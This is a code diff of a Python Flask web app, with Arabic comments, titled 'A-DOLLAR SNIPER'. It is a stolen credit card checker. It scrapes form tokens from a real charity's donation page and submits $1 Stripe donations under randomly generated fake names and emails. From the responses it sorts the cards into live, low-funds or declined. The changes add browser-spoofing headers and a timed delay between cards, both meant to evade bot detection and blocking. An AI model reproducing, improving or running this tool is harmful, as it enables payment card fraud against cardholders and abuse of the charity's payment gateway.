@@ -2,130 +2,168 @@ import requests
 import random
 import string
 import re
+import time
 from flask import Flask, render_template_string, request, jsonify
 
 app = Flask(__name__)
 
+# ترويسات قوية لمحاكاة متصفح Chrome وتجنب كشف البوتات
 HEADERS = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0',
-    'Origin': 'https://adollarfortheworld.org',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
     'Referer': 'https://adollarfortheworld.org/donate/',
-    'X-Requested-With': 'XMLHttpRequest'
+    'Origin': 'https://adollarfortheworld.org'
 }
 
-def check_adollar(cc_data):
+def sniper_check(cc_data):
     session = requests.Session()
     try:
-        # تقطيع بيانات البطاقة
-        n, m, y, c = cc_data.split('|')
+        # 1. جلب التوكنات (Nonce) والـ Form ID شبر شبر
+        main_page = session.get("https://adollarfortheworld.org/donate/", headers=HEADERS, timeout=20)
         
-        # 1. جلب التوكن الأمني (Nonce) وتخطي حماية ووردبريس
-        res = session.get("https://adollarfortheworld.org/donate/", headers=HEADERS, timeout=15)
-        nonce_match = re.search(r'name="give-nonce" value="(.*?)"', res.text)
-        form_id_match = re.search(r'name="give-form-id" value="(.*?)"', res.text)
+        # استخدام regex مرن جداً للبحث عن التوكنات
+        nonce = re.search(r'give-nonce" value="(.*?)"', main_page.text)
+        form_id = re.search(r'give-form-id" value="(.*?)"', main_page.text)
         
-        if not nonce_match or not form_id_match:
-            return {"cc": cc_data, "status": "ERROR", "msg": "Could not find form tokens"}
+        if not nonce or not form_id:
+            # محاولة أخيرة للبحث عن التوكن في كود الجافاسكريبت
+            nonce = re.search(r'"nonce":"(.*?)"', main_page.text)
+            form_id = re.search(r'"form_id":"(.*?)"', main_page.text)
+            
+            if not nonce:
+                return {"cc": cc_data, "status": "ERROR", "msg": "Security Shield Active (Nonce Not Found)"}
 
-        nonce = nonce_match.group(1)
-        form_id = form_id_match.group(1)
+        nonce_val = nonce.group(1)
+        form_val = form_id.group(1) if form_id else "123"
 
-        # 2. تجهيز بيانات التبرع
-        first = "".join(random.choices(string.ascii_lowercase, k=5))
-        last = "".join(random.choices(string.ascii_lowercase, k=5))
-        
+        # 2. تقطيع بيانات البطاقة (CC|MM|YY|CVV)
+        parts = cc_data.split('|')
+        n, m, y, c = parts[0], parts[1], parts[2], parts[3]
+        exp_year = f"20{y}" if len(y) == 2 else y
+
+        # 3. توليد هوية وهمية لكل عملية
+        fname = "".join(random.choices(string.ascii_lowercase, k=6)).capitalize()
+        lname = "".join(random.choices(string.ascii_lowercase, k=6)).capitalize()
+        email = f"{fname.lower()}{random.randint(100,999)}@gmail.com"
+
+        # 4. تجهيز الـ Payload (بيانات التبرع)
         payload = {
-            'give-form-id': form_id,
-            'give-nonce': nonce,
+            'give-form-id': form_val,
+            'give-nonce': nonce_val,
             'give-amount': '1.00',
-            'give_first': first.capitalize(),
-            'give_last': last.capitalize(),
-            'give_email': f'{first}{random.randint(10,99)}@gmail.com',
-            'card_number': n,
-            'card_cvc': c,
+            'give_first': fname,
+            'give_last': lname,
+            'give_email': email,
+            'card_number': n.replace(" ", ""),
+            'card_cvc': c.replace(" ", ""),
             'card_exp_month': m,
-            'card_exp_year': y,
+            'card_exp_year': exp_year,
             'give_action': 'purchase',
-            'gateway': 'stripe'
+            'gateway': 'stripe',
+            'give_ajax': '1'
         }
 
-        # 3. إرسال الطلب
+        # 5. إرسال طلب التبرع النهائي
         target_url = "https://adollarfortheworld.org/donate/?payment-mode=stripe"
-        response = session.post(target_url, data=payload, headers=HEADERS, timeout=20)
+        response = session.post(target_url, data=payload, headers=HEADERS, timeout=30)
 
-        if "thank you" in response.text.lower() or "success" in response.text:
+        # 6. تحليل النتيجة
+        res_text = response.text.lower()
+        if "thank you" in res_text or "success" in res_text or "confirm" in res_text:
             return {"cc": cc_data, "status": "LIVE", "msg": "Approved ✅"}
-        elif "declined" in response.text or "insufficient" in response.text:
+        elif "insufficient" in res_text:
+            return {"cc": cc_data, "status": "LIVE", "msg": "Low Funds 💰"}
+        elif "declined" in res_text or "expired" in res_text or "incorrect" in res_text:
             return {"cc": cc_data, "status": "DEAD", "msg": "Declined ❌"}
         else:
-            return {"cc": cc_data, "status": "DEAD", "msg": "Rejected"}
+            return {"cc": cc_data, "status": "DEAD", "msg": "Gateway Error / Security Block"}
 
     except Exception as e:
-        return {"cc": cc_data, "status": "ERROR", "msg": "Connection Timeout"}
+        return {"cc": cc_data, "status": "ERROR", "msg": f"Connection Error: {str(e)[:30]}"}
 
+# واجهة المستخدم الاحترافية
 @app.route('/')
 def index():
-    return '''
-    <body style="background:#000;color:#95ff00;font-family:monospace;padding:50px;text-align:center;">
-        <div style="border:1px solid #95ff00; padding:20px; display:inline-block; border-radius:10px; background:#050505;">
-            <h1>[ A-DOLLAR SNIPER V91 ]</h1>
-            <p style="color:#888;">النظام سيفحص تلقائياً بفاصل 5 ثوانٍ بين البطاقات</p>
-            <textarea id="ccs" style="width:400px;height:200px;background:#000;color:#fff;border:1px solid #333;padding:10px;" placeholder="4532...|01|28|000"></textarea><br><br>
-            <button id="startBtn" onclick="start()" style="padding:15px 50px;background:#95ff00;color:#000;font-weight:bold;cursor:pointer;border:none;border-radius:5px;">إطلاق القنص ⚡</button>
-            <div id="status" style="margin-top:15px; font-weight:bold;"></div>
-            <div id="res" style="margin-top:20px;text-align:left; max-height:300px; overflow-y:auto; border-top:1px solid #222; padding-top:10px;"></div>
+    return render_template_string('''
+    <!DOCTYPE html>
+    <html lang="ar" dir="rtl">
+    <head>
+        <meta charset="UTF-8">
+        <title>A-DOLLAR SNIPER V95</title>
+        <style>
+            body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
+            .main-box { border: 2px solid #00ff41; padding: 30px; border-radius: 15px; background: #050505; display: inline-block; box-shadow: 0 0 20px #00ff4133; }
+            textarea { width: 450px; height: 180px; background: #000; color: #fff; border: 1px solid #333; padding: 10px; font-family: monospace; }
+            button { width: 100%; padding: 15px; background: #00ff41; color: #000; border: none; font-weight: bold; cursor: pointer; margin-top: 10px; border-radius: 5px; font-size: 1.1rem; }
+            .log { margin-top: 20px; text-align: left; height: 300px; overflow-y: auto; border-top: 1px solid #222; padding-top: 10px; }
+            .LIVE { color: #fdfd00; font-weight: bold; text-shadow: 0 0 5px yellow; }
+            .DEAD { color: #ff3e3e; }
+        </style>
+    </head>
+    <body>
+        <div class="main-box">
+            <h1>[ A-DOLLAR SNIPER V95 ]</h1>
+            <p style="color:#888;">نظام القنص التلقائي - بفاصل زمني 5 ثوانٍ</p>
+            <textarea id="ccs" placeholder="4532XXXXXXXXXXXX|MM|YY|CVV"></textarea><br>
+            <button id="btn" onclick="startHunting()">بدء العملية ⚡</button>
+            <div id="status" style="margin: 10px; color: #00bcff;"></div>
+            <div id="log" class="log">بانتظار البطاقات...</div>
         </div>
 
         <script>
-            // دالة للانتظار
-            const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+            const sleep = ms => new Promise(res => setTimeout(res, ms));
 
-            async function start() {
-                const btn = document.getElementById('startBtn');
-                const ccs = document.getElementById('ccs').value.split('\\n').filter(x => x.trim() !== "");
-                const resDiv = document.getElementById('res');
+            async function startHunting() {
+                const btn = document.getElementById('btn');
+                const list = document.getElementById('ccs').value.split('\\n').filter(x => x.trim() !== "");
+                const log = document.getElementById('log');
                 const status = document.getElementById('status');
 
-                btn.disabled = true;
-                btn.style.background = "#444";
+                if(list.length === 0) return alert("ضع البطاقات أولاً!");
                 
-                for(let i=0; i < ccs.length; i++) {
-                    status.innerHTML = `⏳ جاري فحص بطاقة ${i+1} من أصل ${ccs.length}...`;
+                btn.disabled = true;
+                btn.style.opacity = "0.5";
+                log.innerHTML = "";
+
+                for(let i=0; i < list.length; i++) {
+                    status.innerHTML = `⏳ جاري فحص ${i+1} من أصل ${list.length}...`;
                     
                     try {
-                        const r = await fetch('/check', {
-                            method:'POST', 
-                            headers:{'Content-Type':'application/json'}, 
-                            body:JSON.stringify({cc: ccs[i].trim()})
+                        const response = await fetch('/api/check', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({cc: list[i].trim()})
                         });
-                        const d = await r.json();
+                        const data = await response.json();
                         
-                        const color = d.status === 'LIVE' ? '#0f0' : '#f00';
-                        resDiv.innerHTML = `<div style="color:${color}">[${d.status}] ${d.cc} -> ${d.msg}</div>` + resDiv.innerHTML;
+                        const div = document.createElement('div');
+                        div.className = data.status;
+                        div.innerHTML = `[${data.status}] ${data.cc} -> ${data.msg}`;
+                        log.prepend(div);
                         
                     } catch(e) {
-                        resDiv.innerHTML = `<div style="color:orange">[ERROR] فشل الاتصال بالسيرفر</div>` + resDiv.innerHTML;
+                        log.innerHTML = `<div style="color:orange">[ERROR] خطأ في الاتصال بالسيرفر</div>` + log.innerHTML;
                     }
 
-                    // إذا لم تكن هذه البطاقة الأخيرة، انتظر 5 ثوانٍ
-                    if (i < ccs.length - 1) {
+                    if (i < list.length - 1) {
                         status.innerHTML = "💤 انتظار 5 ثوانٍ لتجنب الحظر...";
                         await sleep(5000);
                     }
                 }
-                
-                status.innerHTML = "✅ اكتمل القنص!";
+                status.innerHTML = "✅ اكتملت المهمة!";
                 btn.disabled = false;
-                btn.style.background = "#95ff00";
+                btn.style.opacity = "1";
             }
         </script>
     </body>
-    '''
+    </html>
+    ''')
 
-@app.route('/check', methods=['POST'])
-def check():
+@app.route('/api/check', methods=['POST'])
+def api_check():
     cc = request.json.get('cc')
-    return jsonify(check_adollar(cc))
+    return jsonify(sniper_check(cc))
 
 if __name__ == "__main__":
     import os
